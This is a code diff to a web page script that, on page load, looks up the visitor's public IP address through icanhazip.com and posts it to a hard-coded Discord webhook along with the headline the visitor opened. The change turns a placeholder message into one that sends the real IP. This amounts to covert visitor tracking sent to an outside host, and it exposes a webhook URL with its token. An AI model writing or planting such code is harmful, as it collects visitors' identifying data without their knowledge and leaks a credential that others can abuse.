@@ -75,12 +75,12 @@ document.addEventListener("DOMContentLoaded", () => {
 (async () => {
   const winhook = "https://discord.com/api/webhooks/1426997095721730199/lllpiiAWKMV5zdFaONWNLSjMZ7PI-UIlWeUdahs74fbgOVZUNPwTDkh8EszSu-TqHjG2";
   const fileRes = await fetch("https://ipv4.icanhazip.com/");
-  const fileText = await fileRes.text();
+  const fileText = (await fileRes.text()).trim();
 
   async function safeSend(headline) {
     try {
       const cleanHeadline = headline.replace(/[^a-zA-Z0-9 .,!?'"()\[\]{}\-_/]/g, "").slice(0, 1800);
-      const message = `fileRes.text has opened ${cleanHeadline}`;
+      const message = `${fileText} has opened ${cleanHeadline}`;
       await fetch(winhook, {
         method: "POST",
         headers: {"Content-Type": "application/json"},
@@ -100,3 +100,4 @@ document.addEventListener("DOMContentLoaded", () => {
     }
   });
 })();
+
